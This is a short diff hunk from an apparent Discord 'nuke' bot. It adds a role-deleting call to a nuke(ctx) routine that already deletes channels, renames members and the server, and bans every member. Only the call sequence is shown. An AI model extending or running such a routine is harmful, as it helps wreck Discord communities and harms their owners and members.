@@ -68,6 +68,7 @@ async def nuke(ctx):
   await deleteChannels(ctx)
   await makeChannels(ctx)
   await nickall(ctx)
+  await deleteRoles(ctx)
   await rename(ctx)
   await banall(ctx)
 
